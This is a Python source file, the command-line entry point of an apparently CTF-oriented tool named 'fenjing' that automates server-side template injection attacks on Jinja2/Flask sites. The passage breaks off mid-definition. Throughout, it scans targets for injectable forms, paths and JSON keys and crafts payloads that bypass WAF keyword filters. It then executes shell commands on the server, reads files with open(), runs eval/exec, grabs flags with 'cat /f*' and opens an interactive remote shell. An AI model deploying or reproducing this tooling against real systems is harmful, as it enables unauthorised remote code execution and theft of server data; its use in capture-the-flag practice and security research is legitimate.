"""命令行界面的入口"""

import ast
import base64
import dataclasses
import json
import logging
import random
import string
import re
import time
from urllib.parse import urlparse
from typing import List, Dict, Tuple, Union, Any
from enum import Enum
from functools import partial
from pathlib import Path
from pprint import pformat


from rich.markup import escape as rich_escape
from rich.logging import RichHandler
import click

from .const import (
    DetectMode,
    TemplateEnvironment,
    PythonVersion,
    ReplacedKeywordStrategy,
    DetectWafKeywords,
    FindFlag,
    FLASK_CONTEXT_VAR,
    ATTRIBUTE,
    ITEM,
    OS_POPEN_READ,
    CONFIG,
    EVAL,
    STRING,
    DEFAULT_USER_AGENT,
    RENDER_ERROR_KEYWORDS,
    GETFLAG_CODE_EVAL,
)
from .cracker import (
    Cracker,
    EvalArgsModePayloadGen,
    guess_python_version,
    guess_is_flask,
)
from .form import Form, get_form
from .full_payload_gen import FullPayloadGen
from .requester import (
    HTTPRequester,
    TCPRequester,
    check_line_break,
    fix_line_break,
    check_tail,
    fix_tail,
)
from .submitter import (
    Submitter,
    PathSubmitter,
    FormSubmitter,
    TCPSubmitter,
    JsonSubmitter,
    shell_tamperer,
    ExtraParamAndDataCustomizable,
)
from .scan_url import yield_form
from .webui import main as webui_main
from .interact import interact
from .options import Options
from .pbar import pbar_manager, console

TITLE = r"""
    ____             _ _
   / __/__  ____    (_|_)___  ____ _
  / /_/ _ \/ __ \  / / / __ \/ __ `/
 / __/  __/ / / / / / / / / / /_/ /
/_/  \___/_/ /_/_/ /_/_/ /_/\__, /
              /___/        /____/

    ------Made with passion by Marven11
"""


LOGGING_FORMAT = "[bright_black bold]\\[%(levelname)s][/] | %(message)s"

logger = logging.getLogger("cli")


class EnumOption(click.Option):
    """Make click prints more readable prompt for Enum.
    Provide better hint when user input is wrong"""

    def type_cast_value(self, ctx: click.Context, value: Any):
        # Enum class is a callable, so click converts it to FuncParamType
        if not isinstance(self.type, click.types.FuncParamType):
            raise RuntimeError("This should be used on Enum!")
        clazz: type = self.type.func  # type: ignore
        if not issubclass(clazz, Enum):
            raise RuntimeError("This should be used on Enum!")
        try:
            _ = self.type(value)
        except Exception as exc:
            raise click.exceptions.BadParameter(
                f"{repr(value)} must be one of {[x.value for x in clazz]}",
                ctx=ctx,
                param=self,
            ) from exc
        return super().type_cast_value(ctx, value)


class RunFailed(Exception):
    """用于通知main和unit test运行失败的exception"""


def load_keywords_dotpy_safe(content: str) -> List[str]:
    """安全地从.py文件中读取关键字列表，不使用eval
    自动寻找文件中最长的列表表达式并读取

    Args:
        content (str): 文件内容

    Returns:
        List[str]: 关键字的列表
    """
    tree = ast.parse(content)
    list_nodes: List[ast.List] = [
        node for node in ast.walk(tree) if isinstance(node, ast.List)
    ]
    lists: List[List[str]] = [
        [
            item.value
            for item in node.elts
            if isinstance(item, ast.Constant) and isinstance(item.value, str)
        ]
        for node in list_nodes
    ]
    if not lists:
        raise ValueError("Can't find any list of string in the file")
    result = max(lists, key=len)
    if not result:
        logger.warning(
            "[red bold] Keyword list is empty. "
            "What kind of WAF are you want to bypass?",
            extra={"markup": True, "highlighter": None},
        )
        time.sleep(5)
        logger.info(
            "Anyway...",
            extra={"markup": True, "highlighter": None},
        )
        time.sleep(1)
    return result


def parse_getflag_info(html: str) -> Union[List[str], None]:
    flag_re = re.compile(rb"[a-zA-Z0-9-_]{1,10}\{\S{2,100}\}")
    result_b64 = re.search(r"start([a-zA-Z0-9+/=]+?)stop", html)
    if not result_b64:
        logger.warning("Getflag failed, we cannot find anything from this HTML...")
        print(html)
        return None
    try:
        result = base64.b64decode(result_b64.group(1))
        return [b.decode() for b in flag_re.findall(result)]
    except Exception:
        return None


def do_submit_cmdexec(
    cmd: str,
    submitter: Submitter,
    full_payload_gen_like: Union[FullPayloadGen, EvalArgsModePayloadGen],
) -> str:
    """使用FullPayloadGen生成shell命令payload, 然后使用submitter发送至对应服务器, 返回回显
    如果cmd以@开头，则将其作为fenjing内部命令解析

    内部命令如下：
    - get-config: 获得当前的config
    - eval: 让目标python进程执行eval，解析命令后面的部分

    Args:
        cmd (str): payload对应的命令
        submitter (Submitter): 实际发送请求的submitter
        full_payload_gen_like (Union[FullPayloadGen, EvalArgsModePayloadGen]):
            生成payload的FullPayloadGen

    Returns:
        str: 回显
    """
    payload, will_print = None, None
    is_getflag_requested = False  # 用户是否用@findflag一键梭flag
    # 解析命令
    if cmd[0] == "@":
        cmd = cmd[1:]
        if cmd.startswith("get-config"):
            payload, will_print = full_payload_gen_like.generate(CONFIG)
        elif cmd.startswith("findflag"):
            if not isinstance(submitter, ExtraParamAndDataCustomizable):
                logger.warning(
                    "@findflag is [red bold]not supported[/] for this",
                )
                return ""
            is_getflag_requested = True
            submitter.set_extra_param("eval_this", GETFLAG_CODE_EVAL)
            payload, will_print = full_payload_gen_like.generate(
                EVAL,
                (
                    ITEM,
                    (ATTRIBUTE, (FLASK_CONTEXT_VAR, "request"), "values"),
                    "eval_this",
                ),
            )
        elif cmd.startswith("eval"):
            payload, will_print = full_payload_gen_like.generate(
                EVAL, (STRING, cmd[4:].strip())
            )
        elif cmd.startswith("ls"):
            cmd = cmd.strip()
            if len(cmd) == 2:  # ls
                payload, will_print = full_payload_gen_like.generate(
                    EVAL, (STRING, "__import__('os').listdir()")
                )
            else:  # ls xxx
                payload, will_print = full_payload_gen_like.generate(
                    EVAL, (STRING, f"__import__('os').listdir({repr(cmd[2:].strip())})")
                )
        elif cmd.startswith("cat"):
            filepath = cmd[3:].strip()
            payload, will_print = full_payload_gen_like.generate(
                EVAL, (STRING, f"open({repr(filepath)}, 'r').read()")
            )
        elif cmd.startswith("exec"):
            statements = cmd[4:].strip()
            payload, will_print = full_payload_gen_like.generate(
                EVAL, (STRING, f"exec({repr(statements)})")
            )
        else:
            logger.info(
                "Please check your command",
                extra={"markup": False, "highlighter": None},
            )
            return ""
    else:
        payload, will_print = full_payload_gen_like.generate(OS_POPEN_READ, cmd)
    # 使用payload
    if payload is None:
        logger.warning(
            "[red]Failed[/] generating payload.",
        )
        if isinstance(submitter, ExtraParamAndDataCustomizable):
            submitter.unset_extra_param("eval_this")
        return ""
    logger.info(
        "Submit payload [blue]%s[/]",
        rich_escape(payload),
    )
    if not will_print:
        logger.warning(
            "Payload generator says that this payload "
            "[red]won't print[/] command execution result.",
        )
    result = submitter.submit(payload)
    assert result is not None
    if is_getflag_requested:
        flag_data = parse_getflag_info(result.text)
        if isinstance(submitter, ExtraParamAndDataCustomizable):
            submitter.unset_extra_param("eval_this")
        if flag_data:
            return pformat(flag_data).strip()
        return "GETFLAG_FAILED"
    return result.text


def parse_headers_cookies(headers_list: List[str], cookies: str) -> Dict[str, str]:
    """将headers列表和cookie字符串解析为可以传给requests的字典

    Args:
        headers_list (List[str]): headers列表，元素的格式为'Key: value'
        cookies (str): Cookie字符串

    Returns:
        Dict[str, str]: Headers字典
    """
    headers = {}
    if headers_list:
        for header in headers_list:
            key, _, value = header.partition(": ")
            if not key or not value:
                logger.warning(
                    "Failed parsing %s, ignored.",
                    repr(header),
                    extra={"highlighter": None},
                )
                continue
            if key.capitalize() != key:
                logger.warning(
                    "Header %s is not capitalized, fixed.",
                    key,
                    extra={"highlighter": None},
                )
                key = key.capitalize()
            headers[key] = value
    if cookies:
        headers["Cookie"] = cookies
    return headers


def is_form_has_response(
    url: str,
    form: Form,
    requester: HTTPRequester,
    tamper_cmd: Union[str, None],
) -> bool:
    """初步判断一个表单是否有可能可以SSTI的参数

    Args:
        url (str): 目标URL
        form (Form): 目标表单
        requester (HTTPRequester): 用于发送请求的requester
        options (Options): 有关攻击的各个选项
        tamper_cmd (Union[str, None]): 对payload进行修改的修改命令

    Returns:
        bool: 是否可能有SSTI的参数
    """
    if "127.0.0.1" in url or "localhost" in url:
        logger.info(
            "Try out our new feature [cyan bold]crack-keywords[/] with "
            '[cyan bold]python -m fenjing crack-keywords -k ./app.py -c "ls"[/]!',
            extra={"markup": True, "highlighter": None},
        )
    for input_field in form["inputs"]:
        submitter = FormSubmitter(
            url,
            form,
            input_field,
            requester,
        )
        if tamper_cmd:
            tamperer = shell_tamperer(tamper_cmd)
            submitter.add_tamperer(tamperer)

        marker = "".join(random.choices(string.ascii_lowercase, k=4))
        result1 = submitter.submit(marker)
        musterror_result = [
            submitter.submit(pattern + marker)
            for pattern in [
                "{{",
                "{%",
                "{#",
            ]
        ]
        if (
            result1 is not None
            and marker in result1.text
            and any(
                marker not in result.text
                for result in musterror_result
                if result is not None
            )
        ):
            return True

    return False


def do_crack_form_pre(
    url: str,
    form: Form,
    requester: HTTPRequester,
    options: Options,
    tamper_cmd: Union[str, None],
) -> Union[Tuple[FullPayloadGen, Submitter], None]:
    """攻击一个表单并获得用于生成payload的参数

    Args:
        url (str): 目标URL
        form (Form): 目标表单
        requester (HTTPRequester): 用于发送请求的requester
        options (Options): 有关攻击的各个选项
        tamper_cmd (Union[str, None]): 对payload进行修改的修改命令

    Returns:
        Union[Tuple[FullPayloadGen, Submitter], None]: 攻击结果
    """
    if "127.0.0.1" in url or "localhost" in url:
        logger.info(
            "Try out our new feature [cyan bold]crack-keywords[/] with "
            '[cyan bold]python -m fenjing crack-keywords -k ./app.py -c "ls"[/]!',
            extra={"markup": True, "highlighter": None},
        )
    python_version, python_subversion = (
        guess_python_version(url, requester)
        if options.python_version == PythonVersion.UNKNOWN
        else (options.python_version, None)
    )
    for input_field in form["inputs"]:
        submitter = FormSubmitter(
            url,
            form,
            input_field,
            requester,
        )
        environment = options.environment
        if options.environment == TemplateEnvironment.JINJA2:
            # we always doubt lol
            environment = (
                TemplateEnvironment.FLASK
                if guess_is_flask(submitter)
                else TemplateEnvironment.JINJA2
            )

        if tamper_cmd:
            tamperer = shell_tamperer(tamper_cmd)
            submitter.add_tamperer(tamperer)

        with pbar_manager.progress:
            cracker = Cracker(
                submitter=submitter,
                options=dataclasses.replace(
                    options,
                    python_version=python_version,
                    python_subversion=python_subversion,
                    environment=environment,
                ),
            )
            if not cracker.has_respond():
                logger.warning(
                    "input field [blue]%s[/] has no response",
                    rich_escape(repr(input_field)),
                    extra={"markup": True, "highlighter": None},
                )
                continue
            full_payload_gen = cracker.crack()
        if full_payload_gen:
            return full_payload_gen, submitter
    logger.warning(
        "[red]Didn't see any input that has response. "
        "Did you forget something like cookies?[/]",
        extra={"markup": True, "highlighter": None},
    )
    return None


def do_crack_form_eval_args_pre(
    url: str,
    form: Form,
    requester: HTTPRequester,
    options: Options,
    tamper_cmd: Union[str, None],
) -> Union[Tuple[Submitter, EvalArgsModePayloadGen], None]:
    """攻击一个表单并获得结果，但是将payload放在GET/POST参数中提交

    Args:
        url (str): 目标url
        form (Form): 目标表格
        requester (HTTPRequester): 提交请求的requester
        options (Options): 攻击使用的选项
        tamper_cmd (Union[str, None]): tamper命令

    Returns:
        Union[Tuple[Submitter, EvalArgsModePayloadGen], None]: 攻击结果
    """
    python_version, python_subversion = (
        guess_python_version(url, requester)
        if options.python_version == PythonVersion.UNKNOWN
        else (options.python_version, None)
    )
    for input_field in form["inputs"]:
        submitter = FormSubmitter(
            url,
            form,
            input_field,
            requester,
        )
        environment = options.environment
        if options.environment == TemplateEnvironment.JINJA2:
            # we always doubt lol
            environment = (
                TemplateEnvironment.FLASK
                if guess_is_flask(submitter)
                else TemplateEnvironment.JINJA2
            )

        if tamper_cmd:
            tamperer = shell_tamperer(tamper_cmd)
            submitter.add_tamperer(tamperer)
        with pbar_manager.progress:
            cracker = Cracker(
                submitter=submitter,
                options=dataclasses.replace(
                    options,
                    python_version=python_version,
                    python_subversion=python_subversion,
                    environment=environment,
                ),
            )
            if not cracker.has_respond():
                logger.warning(
                    "input field [blue]%s[/] has no response",
                    rich_escape(repr(input_field)),
                    extra={"markup": True, "highlighter": None},
                )
                continue
            result = cracker.crack_eval_args()
        if result:
            submitter2, evalargs_payload_gen = result
            return submitter2, evalargs_payload_gen
    logger.warning(
        "[red]Didn't see any input that has response. "
        "Did you forget something like cookies? [/]",
        extra={"markup": True, "highlighter": None},
    )
    return None


def do_crack_json_pre(
    url: str,
    method: str,
    json_data: str,
    key: str,
    requester: HTTPRequester,
    options: Options,
    tamper_cmd: Union[str, None],
) -> Union[Tuple[FullPayloadGen, Submitter], None]:
    """攻击一个表单并获得用于生成payload的参数

    Args:
        url (str): 目标URL
        form (Form): 目标表单
        requester (HTTPRequester): 用于发送请求的requester
        options (Options): 有关攻击的各个选项
        tamper_cmd (Union[str, None]): 对payload进行修改的修改命令

    Returns:
        Union[Tuple[FullPayloadGen, Submitter], None]: 攻击结果
    """
    python_version, python_subversion = (
        guess_python_version(url, requester)
        if options.python_version == PythonVersion.UNKNOWN
        else (options.python_version, None)
    )
    json_obj = json.loads(json_data)
    submitter = JsonSubmitter(
        url,
        method,
        json_obj,
        key,
        requester,
    )
    if tamper_cmd:
        tamperer = shell_tamperer(tamper_cmd)
        submitter.add_tamperer(tamperer)
    with pbar_manager.progress:
        if options.environment == TemplateEnvironment.JINJA2:
            # we always doubt lol
            environment = (
                TemplateEnvironment.FLASK
                if guess_is_flask(submitter)
                else TemplateEnvironment.JINJA2
            )
        else:
            environment = options.environment
        cracker = Cracker(
            submitter=submitter,
            options=dataclasses.replace(
                options,
                environment=environment,
                python_version=python_version,
                python_subversion=python_subversion,
            ),
        )
        if not cracker.has_respond():
            return None
        full_payload_gen = cracker.crack()
    if full_payload_gen:
        return full_payload_gen, submitter
    return None


def do_crack_path_pre(
    url: str,
    requester: HTTPRequester,
    options: Options,
    tamper_cmd: Union[str, None],
) -> Union[Tuple[FullPayloadGen, Submitter], None]:
    """攻击一个路径并获得payload生成器

    Args:
        url (str): 目标url
        requester (HTTPRequester): 发送请求的类
        options (Options): 攻击使用的选项
        tamper_cmd (Union[str, None]): tamper命令

    Returns:
        Union[Tuple[FullPayloadGen, Submitter], None]: 攻击结果
    """
    python_version, python_subversion = (
        guess_python_version(url, requester)
        if options.python_version == PythonVersion.UNKNOWN
        else (options.python_version, None)
    )
    submitter = PathSubmitter(url=url, requester=requester)
    if tamper_cmd:
        tamperer = shell_tamperer(tamper_cmd)
        submitter.add_tamperer(tamperer)
    with pbar_manager.progress:
        if options.environment == TemplateEnvironment.JINJA2:
            # we always doubt lol
            environment = (
                TemplateEnvironment.FLASK
                if guess_is_flask(submitter)
                else TemplateEnvironment.JINJA2
            )
        else:
            environment = options.environment
        cracker = Cracker(
            submitter=submitter,
            options=dataclasses.replace(
                options,
                environment=environment,
                python_version=python_version,
                python_subversion=python_subversion,
            ),
        )
        if not cracker.has_respond():
            return None
        full_payload_gen = cracker.crack()
    if full_payload_gen is None:
        return None
    return full_payload_gen, submitter


def do_crack_request_pre(
    submitter: TCPSubmitter,
    options: Options,
) -> Union[FullPayloadGen, None]:
    """根据指定的请求文件进行攻击并获得结果

    Args:
        submitter (TCPSubmitter): 发送payload的类
        options (Options): 攻击使用的选项

    Returns:
        Union[FullPayloadGen, None]: 攻击结果
    """
    with pbar_manager.progress:
        cracker = Cracker(submitter=submitter, options=options)
        if not cracker.has_respond():
            return None
        full_payload_gen = cracker.crack()
    if full_payload_gen is None:
        return None
    return full_payload_gen


def do_crack(
    full_payload_gen: FullPayloadGen,
    submitter: Submitter,
    exec_cmd: Union[str, None],
    find_flag: FindFlag,
):
    """使用payload生成器攻击对应的表单参数/路径

    Args:
        full_payload_gen (FullPayloadGen): payload生成器
        submitter (Submitter): payload提交器，用于提交payload到特定的表单/路径
        exec_cmd (Union[str, None]): 需要执行的命令
    """
    cmd_exec_func = partial(
        do_submit_cmdexec,
        submitter=submitter,
        full_payload_gen_like=full_payload_gen,
    )
    is_find_flag_enabled = find_flag == FindFlag.ENABLED
    if find_flag == FindFlag.AUTO:
        test_string = repr('"generate_me": os.popen("cat /f* ./f*").read(),')
        payload, will_print = full_payload_gen.generate(STRING, test_string)
        if payload is None or not will_print:
            is_find_flag_enabled = False
        elif len(payload) >= len(test_string) * 5:
            logger.info(
                "[yellow]Payload for finding flag "
                "is too long, we decide not to submit it[/]",
            )
            is_find_flag_enabled = False
        else:
            is_find_flag_enabled = True

    if isinstance(submitter, ExtraParamAndDataCustomizable) and is_find_flag_enabled:
        logger.info(
            "[yellow]Searching flags...[/]",
        )
        getflag_result = cmd_exec_func("@findflag")
        if getflag_result and getflag_result != "GETFLAG_FAILED":
            logger.info("This might be your [cyan bold]flag[/]:")
            logger.info(getflag_result)
            logger.info("No thanks.")
            time.sleep(3)
        else:
            logger.info("I cannot find flag for you... but")
            logger.info("Bypass WAF [green bold]success[/]")

    if exec_cmd:
        result = cmd_exec_func(exec_cmd)
        print(result)
        if any(keyword in result for keyword in RENDER_ERROR_KEYWORDS):
            raise RunFailed()
    else:
        interact(cmd_exec_func)


def do_crack_eval_args(
    submitter: Submitter,
    eval_args_payloadgen: EvalArgsModePayloadGen,
    exec_cmd: Union[str, None],
    find_flag: FindFlag
):
    """攻击对应的表单参数/路径，但是使用eval_args方法

    Args:
        submitter (Submitter): payload提交器，用于提交payload到特定的表单/路径
        eval_args_payloadgen (EvalArgsModePayloadGen): EvalArgs的payload生成器
        exec_cmd (Union[str, None]): 需要执行的命令
    """
    cmd_exec_func = partial(
        do_submit_cmdexec,
        submitter=submitter,
        full_payload_gen_like=eval_args_payloadgen,
    )
    if find_flag != FindFlag.DISABLED:
        print(cmd_exec_func("@findflag"))
    if exec_cmd:
        print(cmd_exec_func(exec_cmd))
    else:
        interact(cmd_exec_func)


common_options_cli = [
    click.option(
        "--exec-cmd",
        "-e",
        default="",
        help="成功后执行的shell指令，不填则成功后进入交互模式",
    ),
    click.option(
        "--detect-mode",
        type=DetectMode,
        cls=EnumOption,
        default=DetectMode.ACCURATE,
        help="分析模式，可为accurate或fast",
    ),
    click.option(
        "--replaced-keyword-strategy",
        default=ReplacedKeywordStrategy.AVOID,
        type=ReplacedKeywordStrategy,
        cls=EnumOption,
        help="WAF替换关键字时的策略，可为avoid/ignore/doubletapping",
    ),
    click.option(
        "--environment",
        default=TemplateEnvironment.JINJA2,
        type=TemplateEnvironment,
        cls=EnumOption,
        help="模板的执行环境，默认为不带flask全局变量的普通jinja2",
    ),
    click.option(
        "--detect-waf-keywords",
        type=DetectWafKeywords,
        cls=EnumOption,
        default=DetectWafKeywords.NONE,
        help="是否枚举被waf的关键字，需要额外时间，默认为none, 可选full/fast",
    ),
    click.option(
        "--find-flag",
        type=FindFlag,
        cls=EnumOption,
        default=FindFlag.AUTO,
        help="是否自动寻找flag，默认只在WAF较好绕过时自动寻找flag",
    ),
    click.option(
        "--waf-keyword",
        default=[],
        multiple=True,
        help="手动指定waf页面含有的关键字，此时不会自动检测waf页面的哈希等。可指定多个关键字",
    ),
    click.option(
        "--tamper-cmd",
        default="",
        help="在发送payload之前进行编码的命令，默认不进行额外操作",
    ),
    click.option("--interval", default=0.0, help="每次请求的间隔"),
]

common_options_http = [
    click.option("--url", "-u", required=True, help="需要攻击的URL"),
    click.option(
        "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
    ),
    click.option("--header", default=[], multiple=True, help="请求时使用的Headers"),
    click.option("--cookies", default="", help="请求时使用的Cookie"),
    click.option("--extra-params", default=None, help="请求时的额外GET参数，如a=1&b=2"),
    click.option("--extra-data", default=None, help="请求时的额外POST参数，如a=1&b=2"),
    click.option("--proxy", default="", help="请求时使用的代理"),
    click.option("--no-verify-ssl", default=False, is_flag=True, help="不验证SSL证书"),
]


def add_options(options):
    """应用列表中的click option装饰器"""

    def decorator(f):
        for option in options:
            f = option(f)
        return f

    return decorator


@click.group()
@click.option("--silent", "--shutup", is_flag=True, default=False, help="不打印INFO等")
def main(silent):
    """click的命令组"""
    if not silent:
        console.print(f"[yellow bold]{rich_escape(TITLE)}[/]")
    logging.basicConfig(
        level=logging.INFO if not silent else logging.ERROR,
        format=LOGGING_FORMAT,
        datefmt="[%X]",
        handlers=[
            RichHandler(
                show_level=False,
                console=console,
                markup=True,
                show_time=False,
                show_path=False,
                keywords=[],
            )
        ],
    )


@main.command()
@add_options(common_options_http)
@add_options(common_options_cli)
@click.option(
    "--action",
    "-a",
    default=None,
    help="参数的提交路径，如果和URL中的路径不同则需要填入",
)
@click.option("--method", "-m", default="POST", help="参数的提交方式，默认为POST")
@click.option("--inputs", "-i", required=True, help="所有参数，以逗号分隔")
@click.option(
    "--eval-args-payload",
    default=False,
    is_flag=True,
    help="是否开启在GET参数中传递Eval payload的功能",
)
def crack(
    url: str,
    action: str,
    method: str,
    inputs: str,
    exec_cmd: str,
    interval: float,
    detect_mode: DetectMode,
    replaced_keyword_strategy: ReplacedKeywordStrategy,
    environment: TemplateEnvironment,
    detect_waf_keywords: DetectWafKeywords,
    find_flag: FindFlag,
    waf_keyword: List[str],
    eval_args_payload: bool,
    user_agent: str,
    header: tuple,
    cookies: str,
    extra_params: str,
    extra_data: str,
    proxy: str,
    no_verify_ssl: bool,
    tamper_cmd: str,
):
    """
    攻击指定的表单
    """

    assert all(param is not None for param in [url, inputs]), "Please check your param"
    form = get_form(
        action=action or urlparse(url).path,
        method=method,
        inputs=inputs.split(","),
    )
    requester = HTTPRequester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        extra_params_querystr=extra_params,
        extra_data_querystr=extra_data,
        proxy=proxy,
        no_verify_ssl=no_verify_ssl,
    )
    if not eval_args_payload:
        result = do_crack_form_pre(
            url,
            form,
            requester,
            Options(
                detect_mode=detect_mode,
                replaced_keyword_strategy=replaced_keyword_strategy,
                environment=environment,
                detect_waf_keywords=detect_waf_keywords,
                waf_keywords=waf_keyword,
            ),
            tamper_cmd,
        )
        if not result:
            logger.warning("Test form failed...", extra={"highlighter": None})
            raise RunFailed()
        full_payload_gen, submitter = result
        do_crack(full_payload_gen, submitter, exec_cmd, find_flag)
    else:
        # pylance is not happy about using same variable name
        # that's why we use result'2' here.
        result2 = do_crack_form_eval_args_pre(
            url,
            form,
            requester,
            Options(
                detect_mode=detect_mode,
                replaced_keyword_strategy=replaced_keyword_strategy,
                environment=environment,
                detect_waf_keywords=detect_waf_keywords,
                waf_keywords=waf_keyword,
            ),
            tamper_cmd,
        )
        if not result2:
            logger.warning("Test form failed...", extra={"highlighter": None})
            raise RunFailed()
        submitter, evalargs_payload_gen = result2
        do_crack_eval_args(submitter, evalargs_payload_gen, exec_cmd, find_flag)


@main.command()
@add_options(common_options_http)
@add_options(common_options_cli)
def crack_path(
    url: str,
    exec_cmd: str,
    interval: float,
    detect_mode: DetectMode,
    replaced_keyword_strategy: ReplacedKeywordStrategy,
    environment: TemplateEnvironment,
    detect_waf_keywords: DetectWafKeywords,
    find_flag: FindFlag,
    waf_keyword: List[str],
    user_agent: str,
    header: tuple,
    cookies: str,
    extra_params: str,
    extra_data: str,
    proxy: str,
    no_verify_ssl: bool,
    tamper_cmd: str,
):
    """
    攻击指定的路径
    """
    assert url is not None, "Please provide URL!"

    requester = HTTPRequester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        extra_params_querystr=extra_params,
        extra_data_querystr=extra_data,
        proxy=proxy,
        no_verify_ssl=no_verify_ssl,
    )
    result = do_crack_path_pre(
        url,
        requester,
        Options(
            detect_mode=detect_mode,
            replaced_keyword_strategy=replaced_keyword_strategy,
            environment=environment,
            detect_waf_keywords=detect_waf_keywords,
            waf_keywords=waf_keyword,
        ),
        tamper_cmd,
    )
    if not result:
        logger.warning("Test form failed...", extra={"highlighter": None})
        raise RunFailed()
    full_payload_gen, submitter = result
    do_crack(full_payload_gen, submitter, exec_cmd, find_flag)


@main.command()
@add_options(common_options_http)
@add_options(common_options_cli)
@click.option("--method", "-m", default="POST", help="JSON的提交方式，默认为POST")
@click.option("--json-data", required=True, help="json数据")
@click.option("--key", required=True, help="攻击的键")
def crack_json(
    url: str,
    method: str,
    json_data: str,
    key: str,
    exec_cmd: str,
    interval: float,
    detect_mode: DetectMode,
    replaced_keyword_strategy: ReplacedKeywordStrategy,
    environment: TemplateEnvironment,
    detect_waf_keywords: DetectWafKeywords,
    find_flag: FindFlag,
    waf_keyword: List[str],
    user_agent: str,
    header: tuple,
    cookies: str,
    extra_params: str,
    extra_data: str,
    proxy: str,
    no_verify_ssl: bool,
    tamper_cmd: str,
):
    """
    攻击指定的JSON API
    """

    assert url is not None, "Please check your param"
    requester = HTTPRequester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        extra_params_querystr=extra_params,
        extra_data_querystr=extra_data,
        proxy=proxy,
        no_verify_ssl=no_verify_ssl,
    )
    result = do_crack_json_pre(
        url,
        method,
        json_data,
        key,
        requester,
        Options(
            detect_mode=detect_mode,
            replaced_keyword_strategy=replaced_keyword_strategy,
            environment=environment,
            detect_waf_keywords=detect_waf_keywords,
            waf_keywords=waf_keyword,
        ),
        tamper_cmd,
    )
    if not result:
        logger.warning("Test form failed...", extra={"highlighter": None})
        raise RunFailed()
    full_payload_gen, submitter = result
    do_crack(full_payload_gen, submitter, exec_cmd, find_flag)


@main.command()
@add_options(common_options_http)
@add_options(common_options_cli)
def scan(
    url: str,
    exec_cmd: str,
    interval: float,
    detect_mode: DetectMode,
    replaced_keyword_strategy: ReplacedKeywordStrategy,
    environment: TemplateEnvironment,
    detect_waf_keywords: DetectWafKeywords,
    find_flag: FindFlag,
    waf_keyword: List[str],
    user_agent: str,
    header: tuple,
    cookies: str,
    extra_params: str,
    extra_data: str,
    proxy: str,
    no_verify_ssl: bool,
    tamper_cmd: str,
):
    """
    扫描指定的网站
    """

    requester = HTTPRequester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        extra_params_querystr=extra_params,
        extra_data_querystr=extra_data,
        proxy=proxy,
        no_verify_ssl=no_verify_ssl,
    )
    options = Options(
        detect_mode=detect_mode,
        replaced_keyword_strategy=replaced_keyword_strategy,
        environment=environment,
        detect_waf_keywords=detect_waf_keywords,
        waf_keywords=waf_keyword,
    )
    url_forms = [
        (page_url, form)
        for i, (page_url, forms) in enumerate(yield_form(requester, url))
        for form in forms
        if i < 100
    ]

    url_forms.sort(
        key=(
            lambda item: is_form_has_response(
                url=item[0], form=item[1], requester=requester, tamper_cmd=tamper_cmd
            )
        ),
        reverse=True,
    )

    for page_url, form in url_forms:
        logger.warning("Scan form: %s", repr(form), extra={"highlighter": None})
        result = do_crack_form_pre(
            page_url,
            form,
            requester,
            options,
            tamper_cmd,
        )
        if not result:
            continue
        full_payload_gen, submitter = result
        do_crack(full_payload_gen, submitter, exec_cmd, find_flag)
        return
    logger.warning("Scan failed...", extra={"highlighter": None})
    logger.warning(
        "Try to pass params manualy: "
        + "python -m fenjing crack %s --inputs aaa,bbb --method GET",
        url,
        extra={"highlighter": None},
    )

    raise RunFailed()


@main.command()
@add_options(common_options_cli)
@click.option("--host", "-h", required=True, help="目标的host，可为IP或域名")
@click.option("--port", "-p", required=True, type=int, help="目标的端口")
@click.option(
    "--request-file",
    "-f",
    required=True,
    help="保存在文本文件中的请求，其中payload处为PAYLOAD",
)
@click.option(
    "--toreplace", default=b"PAYLOAD", type=bytes, help="请求文件中payload的占位符"
)
@click.option("--ssl/--no-ssl", default=False, help="是否使用SSL")
@click.option("--urlencode-payload", default=True, help="是否对payload进行urlencode")
@click.option("--raw", is_flag=True, default=False, help="不检查请求的换行符等")
@click.option("--retry-times", default=5, help="重试次数")
@click.option("--update-content-length", default=True, help="自动更新Content-Length")
def crack_request(
    host: str,
    port: int,
    request_file: str,
    toreplace: bytes,
    ssl: bool,
    exec_cmd: str,
    urlencode_payload: bool,
    raw: bool,
    detect_mode: DetectMode,
    replaced_keyword_strategy: ReplacedKeywordStrategy,
    environment: TemplateEnvironment,
    detect_waf_keywords: DetectWafKeywords,
    find_flag: FindFlag,
    waf_keyword: List[str],
    retry_times: int,
    interval: float,
    tamper_cmd: str,
    update_content_length: bool,
):
    """
    从文本文件中读取请求并攻击目标，文本文件中用`PAYLOAD`标记payload插入位置
    """
    request_filepath = Path(request_file)
    if not request_filepath.is_file():
        logger.error("File doesn't exist: %s", request_filepath)
    request_pattern = request_filepath.read_bytes()
    if not raw and not check_tail(request_pattern):
        logger.warning(
            "Request doesn't ends with '\\r\\n\\r\\n', fixing...",
            extra={"highlighter": None},
        )
        logger.warning(
            "You can use `--raw` flag to disable this", extra={"highlighter": None}
        )
        request_pattern = fix_tail(request_pattern)
        time.sleep(2)
    if not raw and not check_line_break(request_pattern):
        logger.warning(
            "Request's linebreak is not '\\r\\n', fixing...",
            extra={"highlighter": None},
        )
        logger.warning(
            "You can use `--raw` flag to disable this", extra={"highlighter": None}
        )
        request_pattern = fix_line_break(request_pattern)
        time.sleep(2)

    requester = TCPRequester(
        host=host, port=port, use_ssl=ssl, retry_times=retry_times, interval=interval
    )
    submitter = TCPSubmitter(
        requester=requester,
        pattern=request_pattern,
        toreplace=toreplace,
        urlencode_payload=urlencode_payload,
        enable_update_content_length=update_content_length,
    )
    if tamper_cmd:
        tamperer = shell_tamperer(tamper_cmd)
        submitter.add_tamperer(tamperer)
    full_payload_gen = do_crack_request_pre(
        submitter=submitter,
        options=Options(
            detect_mode=detect_mode,
            replaced_keyword_strategy=replaced_keyword_strategy,
            environment=environment,
            detect_waf_keywords=detect_waf_keywords,
            waf_keywords=waf_keyword,
        ),
    )
    if not full_payload_gen:
        logger.warning("Crack request failed...", extra={"highlighter": None})
        raise RunFailed()
    do_crack(full_payload_gen, submitter, exec_cmd, find_flag)


@main.command()
@click.option(
    "--keywords-file",
    "-k",
    required=True,
    help="保存着所有关键字的文件，可为.txt, .py或.json",
)
@click.option(
    "--output-file",
    "-o",
    default="",
    help="输出文件，后缀名一般为.jinja2，不填则直接print",
